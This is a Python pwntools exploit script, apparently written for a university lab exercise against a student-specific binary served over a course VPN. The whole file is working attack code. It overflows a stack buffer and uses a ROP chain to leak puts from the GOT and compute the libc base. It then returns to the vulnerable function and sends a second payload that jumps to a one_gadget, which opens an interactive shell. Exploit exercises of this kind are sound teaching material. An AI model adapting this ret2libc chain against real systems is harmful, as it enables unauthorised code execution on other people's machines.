#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 12)
EXE_FILENAME = '../pwn_student_binaries/rop-test_Federico-Conti'
LIBC_FILENAME = '../pwn_student_binaries/remote-libc/64-bits/libc.so.6'
LD_FILENAME = '../pwn_student_binaries/remote-libc/64-bits/ld-linux-x86-64.so.2'
argv = [EXE_FILENAME]
envp = {}

e = context.binary = ELF(EXE_FILENAME)
libc = ELF(LIBC_FILENAME)

OFFSET_RIP = 224 + 8  # RBP + RIP ... thanks pwn cyclic :)
POP_RDI = 0x00000000004011bb # pop rdi; ret;
RET = POP_RDI + 1
ONE_GADGET = 0xef52b
QUIZ_ADDRESS = 0x0040138b

def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([LD_FILENAME, EXE_FILENAME],
                       env={'LD_PRELOAD': LIBC_FILENAME})


io = start()

payload  = b"a" * (OFFSET_RIP)  
payload += p64(POP_RDI)
payload += p64(e.got.puts)  
payload += p64(e.plt.puts)
payload += p64(QUIZ_ADDRESS)

io.sendlineafter(b'Enter a number: ', payload)
l = io.recvline() [ :- 1]
current_puts = u64(l[:8].ljust(8, b'\x00'))
libc_base = current_puts - libc.symbols.puts
log.info('libc base = %x' % libc_base)


payload  = b"a" * (OFFSET_RIP)
payload += p64(RET)
payload += p64(libc_base + ONE_GADGET)

io.sendlineafter(b'Enter a number: ', payload)

io.interactive()